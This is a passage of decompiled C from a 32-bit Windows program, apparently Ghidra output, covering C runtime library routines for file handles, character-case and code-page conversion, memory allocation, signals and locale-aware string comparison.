    iVar2 = (param_1 & 0x1f) * 8;
    piVar1 = (int *)((&DAT_004137e0)[(int)param_1 >> 5] + iVar2);
    if (((*(byte *)(piVar1 + 1) & 1) != 0) && (*piVar1 != -1)) {
      if (_DAT_0040f8c4 == 1) {
        if (param_1 == 0) {
          nStdHandle = 0xfffffff6;
        }
        else if (param_1 == 1) {
          nStdHandle = 0xfffffff5;
        }
        else {
          if (param_1 != 2) goto LAB_0040ae4b;
          nStdHandle = 0xfffffff4;
        }
        SetStdHandle(nStdHandle,(HANDLE)0x0);
      }
LAB_0040ae4b:
      *(undefined4 *)((&DAT_004137e0)[(int)param_1 >> 5] + iVar2) = 0xffffffff;
      return 0;
    }
  }
  _DAT_004122f8 = 0;
  _DAT_004122f4 = 9;
  return 0xffffffff;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_0040ae6c(uint param_1)

{
  if ((param_1 < DAT_004138e0) &&
     ((*(byte *)((&DAT_004137e0)[(int)param_1 >> 5] + 4 + (param_1 & 0x1f) * 8) & 1) != 0)) {
    return *(undefined4 *)((&DAT_004137e0)[(int)param_1 >> 5] + (param_1 & 0x1f) * 8);
  }
  _DAT_004122f8 = 0;
  _DAT_004122f4 = 9;
  return 0xffffffff;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_0040aea9(uint param_1)

{
  HANDLE hFile;
  BOOL BVar1;
  DWORD DVar2;
  
  DVar2 = _DAT_004122f8;
  if ((param_1 < DAT_004138e0) &&
     ((*(byte *)((&DAT_004137e0)[(int)param_1 >> 5] + 4 + (param_1 & 0x1f) * 8) & 1) != 0)) {
    hFile = (HANDLE)FUN_0040ae6c(param_1);
    BVar1 = FlushFileBuffers(hFile);
    if (BVar1 == 0) {
      DVar2 = GetLastError();
    }
    else {
      DVar2 = 0;
    }
    if (DVar2 == 0) {
      return 0;
    }
  }
  _DAT_004122f8 = DVar2;
  _DAT_004122f4 = 9;
  return 0xffffffff;
}



uint FUN_0040af00(uint param_1)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  undefined4 uVar4;
  uint local_8;
  
  uVar1 = param_1;
  if (DAT_00412348 == 0) {
    if ((0x40 < (int)param_1) && ((int)param_1 < 0x5b)) {
      uVar1 = param_1 + 0x20;
    }
  }
  else {
    uVar4 = 1;
    if ((int)param_1 < 0x100) {
      if (DAT_00411ba4 < 2) {
        uVar2 = (byte)PTR_DAT_00411998[param_1 * 2] & 1;
      }
      else {
        uVar2 = FUN_004087a7(param_1,1);
      }
      if (uVar2 == 0) {
        return uVar1;
      }
    }
    if ((PTR_DAT_00411998[((int)uVar1 >> 8 & 0xffU) * 2 + 1] & 0x80) == 0) {
      param_1 = uVar1 & 0xff | (uint)((uint3)(param_1 >> 8) & 0xffff00) << 8;
    }
    else {
      param_1._0_2_ = CONCAT11((char)uVar1,(char)(uVar1 >> 8));
      param_1 = param_1 & 0xff000000 | (uint)(ushort)param_1;
      uVar4 = 2;
    }
    iVar3 = FUN_0040b997(DAT_00412348,0x100,&param_1,uVar4,&local_8,3,0,1);
    if (iVar3 != 0) {
      if (iVar3 == 1) {
        uVar1 = local_8 & 0xff;
      }
      else {
        uVar1 = local_8 & 0xffff;
      }
    }
  }
  return uVar1;
}



void FUN_0040afcb(undefined4 param_1)

{
  FUN_0040afdc(param_1,0,4);
  return;
}



undefined4 FUN_0040afdc(byte param_1,uint param_2,byte param_3)

{
  if (((&DAT_004126a1)[param_1] & param_3) == 0) {
    if (param_2 == 0) {
      param_2 = 0;
    }
    else {
      param_2 = *(ushort *)(&DAT_004119a2 + (uint)param_1 * 2) & param_2;
    }
    if (param_2 == 0) {
      return 0;
    }
  }
  return 1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_0040b00d(undefined4 param_1)

{
  BYTE *pBVar1;
  byte bVar2;
  byte bVar3;
  UINT CodePage;
  UINT *pUVar4;
  BOOL BVar5;
  uint uVar6;
  BYTE *pBVar7;
  int iVar8;
  byte *pbVar9;
  int iVar10;
  byte *pbVar11;
  undefined4 *puVar12;
  _cpinfo local_1c;
  uint local_8;
  
  CodePage = FUN_0040b1a6(param_1);
  if (CodePage == DAT_00412588) {
    return 0;
  }
  if (CodePage != 0) {
    iVar10 = 0;
    pUVar4 = &DAT_004121a0;
    do {
      if (*pUVar4 == CodePage) {
        puVar12 = (undefined4 *)&DAT_004126a0;
        for (iVar8 = 0x40; iVar8 != 0; iVar8 = iVar8 + -1) {
          *puVar12 = 0;
          puVar12 = puVar12 + 1;
        }
        local_8 = 0;
        *(undefined *)puVar12 = 0;
        pbVar11 = &DAT_004121b0 + iVar10 * 0x30;
        do {
          bVar2 = *pbVar11;
          pbVar9 = pbVar11;
          while ((bVar2 != 0 && (bVar2 = pbVar9[1], bVar2 != 0))) {
            uVar6 = (uint)*pbVar9;
            if (uVar6 <= bVar2) {
              bVar3 = (&DAT_00412198)[local_8];
              do {
                (&DAT_004126a1)[uVar6] = (&DAT_004126a1)[uVar6] | bVar3;
                uVar6 = uVar6 + 1;
              } while (uVar6 <= bVar2);
            }
            pbVar9 = pbVar9 + 2;
            bVar2 = *pbVar9;
          }
          local_8 = local_8 + 1;
          pbVar11 = pbVar11 + 8;
        } while (local_8 < 4);
        _DAT_0041259c = 1;
        DAT_00412588 = CodePage;
        DAT_004127a4 = FUN_0040b1f0(CodePage);
        DAT_00412590 = (&DAT_004121a4)[iVar10 * 0xc];
        DAT_00412594 = (&DAT_004121a8)[iVar10 * 0xc];
        DAT_00412598 = (&DAT_004121ac)[iVar10 * 0xc];
        goto LAB_0040b195;
      }
      pUVar4 = pUVar4 + 0xc;
      iVar10 = iVar10 + 1;
    } while (pUVar4 < (UINT *)0x412290);
    BVar5 = GetCPInfo(CodePage,&local_1c);
    if (BVar5 == 1) {
      puVar12 = (undefined4 *)&DAT_004126a0;
      DAT_00412588 = CodePage;
      for (iVar10 = 0x40; iVar10 != 0; iVar10 = iVar10 + -1) {
        *puVar12 = 0;
        puVar12 = puVar12 + 1;
      }
      *(undefined *)puVar12 = 0;
      DAT_004127a4 = 0;
      if (local_1c.MaxCharSize < 2) {
        _DAT_0041259c = 0;
      }
      else {
        if (local_1c.LeadByte[0] != '\0') {
          pBVar7 = local_1c.LeadByte + 1;
          do {
            bVar2 = *pBVar7;
            if (bVar2 == 0) break;
            for (uVar6 = (uint)pBVar7[-1]; uVar6 <= bVar2; uVar6 = uVar6 + 1) {
              (&DAT_004126a1)[uVar6] = (&DAT_004126a1)[uVar6] | 4;
            }
            pBVar1 = pBVar7 + 1;
            pBVar7 = pBVar7 + 2;
          } while (*pBVar1 != 0);
        }
        uVar6 = 1;
        do {
          (&DAT_004126a1)[uVar6] = (&DAT_004126a1)[uVar6] | 8;
          uVar6 = uVar6 + 1;
        } while (uVar6 < 0xff);
        DAT_004127a4 = FUN_0040b1f0(CodePage);
        _DAT_0041259c = 1;
      }
      DAT_00412590 = 0;
      DAT_00412594 = 0;
      DAT_00412598 = 0;
      goto LAB_0040b195;
    }
    if (_DAT_00412554 == 0) {
      return 0xffffffff;
    }
  }
  FUN_0040b223();
LAB_0040b195:
  FUN_0040b24c();
  return 0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int FUN_0040b1a6(int param_1)

{
  int iVar1;
  bool bVar2;
  
  if (param_1 == -2) {
    _DAT_00412554 = 1;
                    // WARNING: Could not recover jumptable at 0x0040b1c0. Too many branches
                    // WARNING: Treating indirect jump as call
    iVar1 = GetOEMCP();
    return iVar1;
  }
  if (param_1 == -3) {
    _DAT_00412554 = 1;
                    // WARNING: Could not recover jumptable at 0x0040b1d5. Too many branches
                    // WARNING: Treating indirect jump as call
    iVar1 = GetACP();
    return iVar1;
  }
  bVar2 = param_1 == -4;
  if (bVar2) {
    param_1 = DAT_00412358;
  }
  _DAT_00412554 = (uint)bVar2;
  return param_1;
}



undefined4 FUN_0040b1f0(int param_1)

{
  if (param_1 == 0x3a4) {
    return 0x411;
  }
  if (param_1 == 0x3a8) {
    return 0x804;
  }
  if (param_1 == 0x3b5) {
    return 0x412;
  }
  if (param_1 != 0x3b6) {
    return 0;
  }
  return 0x404;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0040b223(void)

{
  int iVar1;
  undefined4 *puVar2;
  
  puVar2 = (undefined4 *)&DAT_004126a0;
  for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  *(undefined *)puVar2 = 0;
  DAT_00412588 = 0;
  _DAT_0041259c = 0;
  DAT_004127a4 = 0;
  DAT_00412590 = 0;
  DAT_00412594 = 0;
  DAT_00412598 = 0;
  return;
}



void FUN_0040b24c(void)

{
  BOOL BVar1;
  uint uVar2;
  char cVar3;
  uint uVar4;
  uint uVar5;
  ushort *puVar6;
  undefined uVar7;
  BYTE *pBVar8;
  undefined4 *puVar9;
  ushort local_518 [256];
  undefined local_318 [256];
  undefined local_218 [256];
  undefined4 local_118 [64];
  _cpinfo local_18;
  
  BVar1 = GetCPInfo(DAT_00412588,&local_18);
  if (BVar1 == 1) {
    uVar2 = 0;
    do {
      *(char *)((int)local_118 + uVar2) = (char)uVar2;
      uVar2 = uVar2 + 1;
    } while (uVar2 < 0x100);
    local_118[0]._0_1_ = 0x20;
    if (local_18.LeadByte[0] != 0) {
      pBVar8 = local_18.LeadByte + 1;
      do {
        uVar2 = (uint)local_18.LeadByte[0];
        if (uVar2 <= *pBVar8) {
          uVar4 = (*pBVar8 - uVar2) + 1;
          puVar9 = (undefined4 *)((int)local_118 + uVar2);
          for (uVar5 = uVar4 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {
            *puVar9 = 0x20202020;
            puVar9 = puVar9 + 1;
          }
          for (uVar4 = uVar4 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {
            *(undefined *)puVar9 = 0x20;
            puVar9 = (undefined4 *)((int)puVar9 + 1);
          }
        }
        local_18.LeadByte[0] = pBVar8[1];
        pBVar8 = pBVar8 + 2;
      } while (local_18.LeadByte[0] != 0);
    }
    FUN_0040aab8(1,local_118,0x100,local_518,DAT_00412588,DAT_004127a4,0);
    FUN_0040b997(DAT_004127a4,0x100,local_118,0x100,local_218,0x100,DAT_00412588,0);
    FUN_0040b997(DAT_004127a4,0x200,local_118,0x100,local_318,0x100,DAT_00412588,0);
    uVar2 = 0;
    puVar6 = local_518;
    do {
      if ((*puVar6 & 1) == 0) {
        if ((*puVar6 & 2) != 0) {
          (&DAT_004126a1)[uVar2] = (&DAT_004126a1)[uVar2] | 0x20;
          uVar7 = local_318[uVar2];
          goto LAB_0040b358;
        }
        (&DAT_004125a0)[uVar2] = 0;
      }
      else {
        (&DAT_004126a1)[uVar2] = (&DAT_004126a1)[uVar2] | 0x10;
        uVar7 = local_218[uVar2];
LAB_0040b358:
        (&DAT_004125a0)[uVar2] = uVar7;
      }
      uVar2 = uVar2 + 1;
      puVar6 = puVar6 + 1;
    } while (uVar2 < 0x100);
  }
  else {
    uVar2 = 0;
    do {
      if ((uVar2 < 0x41) || (0x5a < uVar2)) {
        if ((0x60 < uVar2) && (uVar2 < 0x7b)) {
          (&DAT_004126a1)[uVar2] = (&DAT_004126a1)[uVar2] | 0x20;
          cVar3 = (char)uVar2 + -0x20;
          goto LAB_0040b3a2;
        }
        (&DAT_004125a0)[uVar2] = 0;
      }
      else {
        (&DAT_004126a1)[uVar2] = (&DAT_004126a1)[uVar2] | 0x10;
        cVar3 = (char)uVar2 + ' ';
LAB_0040b3a2:
        (&DAT_004125a0)[uVar2] = cVar3;
      }
      uVar2 = uVar2 + 1;
    } while (uVar2 < 0x100);
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0040b3d1(void)

{
  if (_DAT_0041390c == 0) {
    FUN_0040b00d(0xfffffffd);
    _DAT_0041390c = 1;
  }
  return;
}



int FUN_0040b3ed(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  HMODULE hModule;
  int iVar1;
  
  iVar1 = 0;
  if (DAT_00412558 == (FARPROC)0x0) {
    hModule = LoadLibraryA("user32.dll");
    if (hModule != (HMODULE)0x0) {
      DAT_00412558 = GetProcAddress(hModule,"MessageBoxA");
      if (DAT_00412558 != (FARPROC)0x0) {
        DAT_0041255c = GetProcAddress(hModule,"GetActiveWindow");
        DAT_00412560 = GetProcAddress(hModule,"GetLastActivePopup");
        goto LAB_0040b43c;
      }
    }
    iVar1 = 0;
  }
  else {
LAB_0040b43c:
    if (DAT_0041255c != (FARPROC)0x0) {
      iVar1 = (*DAT_0041255c)();
      if ((iVar1 != 0) && (DAT_00412560 != (FARPROC)0x0)) {
        iVar1 = (*DAT_00412560)(iVar1);
      }
    }
    iVar1 = (*DAT_00412558)(iVar1,param_1,param_2,param_3);
  }
  return iVar1;
}



undefined4 FUN_0040b476(int param_1)

{
  int iVar1;
  int iVar2;
  undefined4 *puVar3;
  int iVar4;
  int iVar5;
  code *pcVar6;
  
  iVar2 = param_1;
  if (param_1 == 2) {
    puVar3 = &DAT_00412564;
    pcVar6 = DAT_00412564;
  }
  else if (((param_1 == 4) || (param_1 == 8)) || (param_1 == 0xb)) {
    iVar4 = FUN_0040b5a3(param_1);
    pcVar6 = *(code **)(iVar4 + 8);
    puVar3 = (undefined4 *)(iVar4 + 8);
  }
  else if (param_1 == 0xf) {
    puVar3 = &DAT_00412570;
    pcVar6 = DAT_00412570;
  }
  else if (param_1 == 0x15) {
    puVar3 = &DAT_00412568;
    pcVar6 = DAT_00412568;
  }
  else {
    if (param_1 != 0x16) {
      return 0xffffffff;
    }
    puVar3 = &DAT_0041256c;
    pcVar6 = DAT_0041256c;
  }
  if (pcVar6 == (code *)0x1) {
    return 0;
  }
  if (pcVar6 == (code *)0x0) {
    __exit(3);
  }
  iVar1 = DAT_0041242c;
  iVar4 = DAT_00411cf4;
  if (((param_1 == 8) || (param_1 == 0xb)) || (iVar5 = param_1, param_1 == 4)) {
    DAT_0041242c = 0;
    iVar5 = iVar1;
    if (param_1 == 8) {
      DAT_00411cf4 = 0x8c;
      param_1 = iVar4;
      goto LAB_0040b53a;
    }
LAB_0040b566:
    *puVar3 = 0;
    if (iVar2 != 8) {
      (*pcVar6)(iVar2);
      if ((iVar2 != 0xb) && (iVar2 != 4)) {
        return 0;
      }
      goto LAB_0040b589;
    }
  }
  else {
LAB_0040b53a:
    if (iVar2 != 8) goto LAB_0040b566;
    if (DAT_00411ce8 < DAT_00411cec + DAT_00411ce8) {
      iVar4 = (DAT_00411cec + DAT_00411ce8) - DAT_00411ce8;
      puVar3 = (undefined4 *)(DAT_00411ce8 * 0xc + 0x411c78);
      do {
        *puVar3 = 0;
        puVar3 = puVar3 + 3;
        iVar4 = iVar4 + -1;
      } while (iVar4 != 0);
    }
  }
  (*pcVar6)(8,DAT_00411cf4);
LAB_0040b589:
  if (iVar2 == 8) {
    DAT_00411cf4 = param_1;
  }
  DAT_0041242c = iVar5;
  return 0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined * FUN_0040b5a3(int param_1)

{
  int *piVar1;
  undefined *puVar2;
  undefined *puVar3;
  
  puVar2 = &DAT_00411c70;
  if (_DAT_00411c74 != param_1) {
    puVar3 = puVar2;
    do {
      puVar2 = puVar3 + 0xc;
      if (&DAT_00411c70 + DAT_00411cf0 * 0xc <= puVar2) break;
      piVar1 = (int *)(puVar3 + 0x10);
      puVar3 = puVar2;
    } while (*piVar1 != param_1);
  }
  if ((&DAT_00411c70 + DAT_00411cf0 * 0xc <= puVar2) || (*(int *)(puVar2 + 4) != param_1)) {
    puVar2 = (undefined *)0x0;
  }
  return puVar2;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void * FUN_0040b5e8(int param_1,int param_2)

{
  size_t _Size;
  void *_Dst;
  int iVar1;
  uint uVar2;
  uint uVar3;
  LPVOID pvVar4;
  
  uVar2 = param_1 * param_2;
  uVar3 = uVar2;
  if (uVar2 < 0xffffffe1) {
    if (uVar2 == 0) {
      uVar3 = 1;
    }
    uVar3 = uVar3 + 0xf & 0xfffffff0;
  }
  do {
    pvVar4 = (LPVOID)0x0;
    if (uVar3 < 0xffffffe1) {
      if (DAT_00413904 == 3) {
        if (uVar2 <= _DAT_004138fc) {
          _Dst = (void *)FUN_00407914(uVar2);
          _Size = uVar2;
joined_r0x0040b651:
          if (_Dst != (void *)0x0) {
            _memset(_Dst,0,_Size);
            return _Dst;
          }
        }
      }
      else if ((DAT_00413904 == 2) && (uVar3 <= _DAT_00411994)) {
        _Dst = (void *)FUN_004083b7(uVar3 >> 4);
        _Size = uVar3;
        goto joined_r0x0040b651;
      }
      pvVar4 = HeapAlloc(DAT_00413900,8,uVar3);
      if (pvVar4 != (LPVOID)0x0) {
        return pvVar4;
      }
    }
    if (DAT_00412364 == 0) {
      return pvVar4;
    }
    iVar1 = FUN_0040878c(uVar3);
    if (iVar1 == 0) {
      return (void *)0x0;
    }
  } while( true );
}



void FUN_0040b6f1(void)

{
  __amsg_exit(2);
  return;
}



uint FUN_0040b6fa(uint param_1,int *param_2)

{
  uint uVar1;
  int iVar2;
  int *piVar3;
  int iVar4;
  undefined *puVar5;
  uint uVar6;
  
  piVar3 = param_2;
  uVar6 = param_2[3];
  uVar1 = param_2[4];
  if (((uVar6 & 0x82) == 0) || ((uVar6 & 0x40) != 0)) {
LAB_0040b810:
    param_2[3] = uVar6 | 0x20;
  }
  else {
    if ((uVar6 & 1) != 0) {
      param_2[1] = 0;
      if ((uVar6 & 0x10) == 0) goto LAB_0040b810;
      *param_2 = param_2[2];
      param_2[3] = uVar6 & 0xfffffffe;
    }
    uVar6 = param_2[3];
    param_2[1] = 0;
    param_2 = (int *)0x0;
    piVar3[3] = uVar6 & 0xffffffef | 2;
    if (((uVar6 & 0x10c) == 0) &&
       (((piVar3 != (int *)&DAT_00411db0 && (piVar3 != (int *)&DAT_00411dd0)) ||
        (iVar4 = FUN_0040a00d(uVar1), iVar4 == 0)))) {
      FUN_00409fc9(piVar3);
    }
    uVar6 = param_1;
    if ((*(ushort *)(piVar3 + 3) & 0x108) == 0) {
      iVar4 = 2;
      param_2 = (int *)FUN_00408f66(uVar1,&param_1,2);
    }
    else {
      iVar2 = piVar3[2];
      iVar4 = *piVar3 - iVar2;
      *piVar3 = iVar2 + 2;
      piVar3[1] = piVar3[6] + -2;
      if (iVar4 < 1) {
        if (uVar1 == 0xffffffff) {
          puVar5 = &DAT_00411cf8;
        }
        else {
          puVar5 = (undefined *)((&DAT_004137e0)[(int)uVar1 >> 5] + (uVar1 & 0x1f) * 8);
        }
        if ((puVar5[4] & 0x20) != 0) {
          FUN_00409f2f(uVar1,0,2);
        }
      }
      else {
        param_2 = (int *)FUN_00408f66(uVar1,iVar2,iVar4);
      }
      *(short *)piVar3[2] = (short)param_1;
      uVar6 = param_1;
    }
    if (param_2 == (int *)iVar4) {
      return uVar6 & 0xffff;
    }
    piVar3[3] = piVar3[3] | 0x20;
  }
  return 0xffff;
}



uint FUN_0040b81e(uint param_1)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  undefined4 uVar4;
  uint local_8;
  
  uVar1 = param_1;
  if (DAT_00412348 == 0) {
    if ((0x60 < (int)param_1) && ((int)param_1 < 0x7b)) {
      uVar1 = param_1 - 0x20;
    }
  }
  else {
    if ((int)param_1 < 0x100) {
      if (DAT_00411ba4 < 2) {
        uVar2 = (byte)PTR_DAT_00411998[param_1 * 2] & 2;
      }
      else {
        uVar2 = FUN_004087a7(param_1,2);
      }
      if (uVar2 == 0) {
        return uVar1;
      }
    }
    if ((PTR_DAT_00411998[((int)uVar1 >> 8 & 0xffU) * 2 + 1] & 0x80) == 0) {
      param_1 = uVar1 & 0xff | (uint)((uint3)(param_1 >> 8) & 0xffff00) << 8;
      uVar4 = 1;
    }
    else {
      param_1._0_2_ = CONCAT11((char)uVar1,(char)(uVar1 >> 8));
      param_1 = param_1 & 0xff000000 | (uint)(ushort)param_1;
      uVar4 = 2;
    }
    iVar3 = FUN_0040b997(DAT_00412348,0x200,&param_1,uVar4,&local_8,3,0,1);
    if (iVar3 != 0) {
      if (iVar3 == 1) {
        uVar1 = local_8 & 0xff;
      }
      else {
        uVar1 = local_8 & 0xffff;
      }
    }
  }
  return uVar1;
}



// Library Function - Single Match
//  __mbsnbicoll
// 
// Library: Visual Studio 2003 Release

int __cdecl __mbsnbicoll(uchar *_Str1,uchar *_Str2,size_t _MaxCount)

{
  int iVar1;
  
  if (_MaxCount == 0) {
    return 0;
  }
  iVar1 = FUN_0040bbe6(DAT_004127a4,1,_Str1,_MaxCount,_Str2,_MaxCount,DAT_00412588);
  if (iVar1 == 0) {
    return 0x7fffffff;
  }
  return iVar1 + -2;
}



undefined4 FUN_0040b929(void)

{
  LPCWSTR lpWideCharStr;
  size_t _Size;
  LPSTR lpMultiByteStr;
  int iVar1;
  LPCWSTR *ppWVar2;
  
  lpWideCharStr = *DAT_00412324;
  ppWVar2 = DAT_00412324;
  while( true ) {
    if (lpWideCharStr == (LPCWSTR)0x0) {
      return 0;
    }
    _Size = WideCharToMultiByte(1,0,lpWideCharStr,-1,(LPSTR)0x0,0,(LPCSTR)0x0,(LPBOOL)0x0);
    if (((_Size == 0) || (lpMultiByteStr = (LPSTR)_malloc(_Size), lpMultiByteStr == (LPSTR)0x0)) ||
       (iVar1 = WideCharToMultiByte(1,0,*ppWVar2,-1,lpMultiByteStr,_Size,(LPCSTR)0x0,(LPBOOL)0x0),
       iVar1 == 0)) break;
    FUN_0040be63(lpMultiByteStr,0);
    lpWideCharStr = ppWVar2[1];
    ppWVar2 = ppWVar2 + 1;
  }
  return 0xffffffff;
}



int FUN_0040b997(LCID param_1,uint param_2,LPCSTR param_3,int param_4,LPWSTR param_5,int param_6,
                UINT param_7,int param_8)

{
  int iVar1;
  int iVar2;
  void *local_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &DAT_0040d7e8;
  puStack_10 = &LAB_00409b74;
  local_14 = ExceptionList;
  ExceptionList = &local_14;
  if (DAT_00412578 == 0) {
    ExceptionList = &local_14;
    iVar1 = LCMapStringW(0,0x100,L"",1,(LPWSTR)0x0,0);
    if (iVar1 == 0) {
      iVar1 = LCMapStringA(0,0x100,"",1,(LPSTR)0x0,0);
      if (iVar1 == 0) {
        ExceptionList = local_14;
        return 0;
      }
      DAT_00412578 = 2;
    }
    else {
      DAT_00412578 = 1;
    }
  }
  if (0 < param_4) {
    param_4 = FUN_0040bbbb(param_3,param_4);
  }
  if (DAT_00412578 == 2) {
    iVar1 = LCMapStringA(param_1,param_2,param_3,param_4,(LPSTR)param_5,param_6);
    ExceptionList = local_14;
    return iVar1;
  }
  if (DAT_00412578 == 1) {
    if (param_7 == 0) {
      param_7 = DAT_00412358;
    }
    iVar1 = MultiByteToWideChar(param_7,(-(uint)(param_8 != 0) & 8) + 1,param_3,param_4,(LPWSTR)0x0,
                                0);
    if (iVar1 != 0) {
      local_8 = 0;
      FUN_00404830();
      local_8 = 0xffffffff;
      if ((&stack0x00000000 != (undefined *)0x3c) &&
         (iVar2 = MultiByteToWideChar(param_7,1,param_3,param_4,(LPWSTR)&stack0xffffffc4,iVar1),
         iVar2 != 0)) {
        iVar2 = LCMapStringW(param_1,param_2,(LPCWSTR)&stack0xffffffc4,iVar1,(LPWSTR)0x0,0);
        if (iVar2 != 0) {
          if ((param_2 & 0x400) == 0) {
            local_8 = 1;
            FUN_00404830();
            local_8 = 0xffffffff;
            if (&stack0x00000000 == (undefined *)0x3c) {
              ExceptionList = local_14;
              return 0;
            }
            iVar1 = LCMapStringW(param_1,param_2,(LPCWSTR)&stack0xffffffc4,iVar1,
                                 (LPWSTR)&stack0xffffffc4,iVar2);
            if (iVar1 == 0) {
              ExceptionList = local_14;
              return 0;
            }
            if (param_6 == 0) {
              param_6 = 0;
              param_5 = (LPWSTR)0x0;
            }
            iVar2 = WideCharToMultiByte(param_7,0x220,(LPCWSTR)&stack0xffffffc4,iVar2,(LPSTR)param_5
                                        ,param_6,(LPCSTR)0x0,(LPBOOL)0x0);
            iVar1 = iVar2;
          }
          else {
            if (param_6 == 0) {
              ExceptionList = local_14;
              return iVar2;
            }
            if (param_6 < iVar2) {
              ExceptionList = local_14;
              return 0;
            }
            iVar1 = LCMapStringW(param_1,param_2,(LPCWSTR)&stack0xffffffc4,iVar1,param_5,param_6);
          }
          if (iVar1 != 0) {
            ExceptionList = local_14;
            return iVar2;
          }
        }
      }
    }
  }
  ExceptionList = local_14;
  return 0;
}



int FUN_0040bbbb(char *param_1,int param_2)

{
  char *pcVar1;
  int iVar2;
  
  pcVar1 = param_1;
  iVar2 = param_2;
  if (param_2 != 0) {
    do {
      iVar2 = iVar2 + -1;
      if (*pcVar1 == '\0') break;
      pcVar1 = pcVar1 + 1;
    } while (iVar2 != 0);
  }
  if (*pcVar1 == '\0') {
    return (int)pcVar1 - (int)param_1;
  }
  return param_2;
}



int FUN_0040bbe6(LCID param_1,DWORD param_2,byte *param_3,int param_4,byte *param_5,int param_6,
                UINT param_7)

{
  undefined *puVar1;
  int iVar2;
  BOOL BVar3;
  BYTE *pBVar4;
  int iVar5;
  _cpinfo local_40;
  undefined *local_2c;
  PCNZWCH local_28;
  int local_24;
  int local_20;
  undefined *local_1c;
  void *local_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &DAT_0040d800;
  puStack_10 = &LAB_00409b74;
  local_14 = ExceptionList;
  local_1c = &stack0xffffffb0;
  ExceptionList = &local_14;
  puVar1 = &stack0xffffffb0;
  if (DAT_00412580 == 0) {
    ExceptionList = &local_14;
    iVar2 = CompareStringW(0,0,L"",1,L"",1);
    if (iVar2 == 0) {
      iVar2 = CompareStringA(0,0,"",1,"",1);
      if (iVar2 == 0) {
        ExceptionList = local_14;
        return 0;
      }
      DAT_00412580 = 2;
      puVar1 = local_1c;
    }
    else {
      DAT_00412580 = 1;
      puVar1 = local_1c;
    }
  }
  local_1c = puVar1;
  if (0 < param_4) {
    param_4 = FUN_0040bbbb(param_3,param_4);
  }
  if (0 < param_6) {
    param_6 = FUN_0040bbbb(param_5,param_6);
  }
  if (DAT_00412580 == 2) {
    iVar2 = CompareStringA(param_1,param_2,(PCNZCH)param_3,param_4,(PCNZCH)param_5,param_6);
    ExceptionList = local_14;
    return iVar2;
  }
  if (DAT_00412580 == 1) {
    if (param_7 == 0) {
      param_7 = DAT_00412358;
    }
    if ((param_4 == 0) || (param_6 == 0)) {
      if (param_4 == param_6) {
        ExceptionList = local_14;
        return 2;
      }
      if (1 < param_6) {
        ExceptionList = local_14;
        return 1;
      }
      if (1 < param_4) {
        ExceptionList = local_14;
        return 3;
      }
      BVar3 = GetCPInfo(param_7,&local_40);
      if (BVar3 == 0) {
        ExceptionList = local_14;
        return 0;
      }
      if (0 < param_4) {
        if (local_40.MaxCharSize < 2) {
          ExceptionList = local_14;
          return 3;
        }
        pBVar4 = local_40.LeadByte;
        while( true ) {
          if (local_40.LeadByte[0] == 0) {
            ExceptionList = local_14;
            return 3;
          }
          if (pBVar4[1] == 0) break;
          if ((*pBVar4 <= *param_3) && (*param_3 <= pBVar4[1])) {
            ExceptionList = local_14;
            return 2;
          }
          pBVar4 = pBVar4 + 2;
          local_40.LeadByte[0] = *pBVar4;
        }
        ExceptionList = local_14;
        return 3;
      }
      if (0 < param_6) {
        if (local_40.MaxCharSize < 2) {
          ExceptionList = local_14;
          return 1;
        }
        pBVar4 = local_40.LeadByte;
        while( true ) {
          if (local_40.LeadByte[0] == 0) {
            ExceptionList = local_14;
            return 1;
          }
          if (pBVar4[1] == 0) break;
          if ((*pBVar4 <= *param_5) && (*param_5 <= pBVar4[1])) {
            ExceptionList = local_14;
            return 2;
          }
          pBVar4 = pBVar4 + 2;
          local_40.LeadByte[0] = *pBVar4;
        }
        ExceptionList = local_14;
        return 1;
      }
    }
    local_28 = (PCNZWCH)&stack0xffffffb0;
    local_20 = MultiByteToWideChar(param_7,9,(LPCSTR)param_3,param_4,(LPWSTR)0x0,0);
    if (local_20 != 0) {
      local_8 = 0;
      FUN_00404830();
      local_8 = 0xffffffff;
      if ((&stack0x00000000 != (undefined *)0x50) &&
         (local_1c = &stack0xffffffb0,
         iVar2 = MultiByteToWideChar(param_7,1,(LPCSTR)param_3,param_4,(LPWSTR)&stack0xffffffb0,
                                     local_20), iVar2 != 0)) {
        local_2c = &stack0xffffffb0;
        iVar2 = MultiByteToWideChar(param_7,9,(LPCSTR)param_5,param_6,(LPWSTR)0x0,0);
        if (iVar2 != 0) {
          local_8 = 1;
          local_24 = iVar2;
          FUN_00404830();
          local_8 = 0xffffffff;
          if ((&stack0x00000000 != (undefined *)0x50) &&
             (local_1c = &stack0xffffffb0,
             iVar5 = MultiByteToWideChar(param_7,1,(LPCSTR)param_5,param_6,(LPWSTR)&stack0xffffffb0,
                                         iVar2), iVar5 != 0)) {
            iVar2 = CompareStringW(param_1,param_2,local_28,local_20,(PCNZWCH)&stack0xffffffb0,iVar2
                                  );
            ExceptionList = local_14;
            return iVar2;
          }
        }
      }
    }
  }
  ExceptionList = local_14;
  return 0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_0040be63(char *param_1,int param_2)

{
  char *pcVar1;
  int iVar2;
  int *piVar3;
  size_t sVar4;
  char *_Dest;
  int *piVar5;
  bool bVar6;
  
  if (param_1 == (char *)0x0) {
    return 0xffffffff;
  }
  pcVar1 = (char *)FUN_0040c0a9(param_1,0x3d);
  if (pcVar1 == (char *)0x0) {
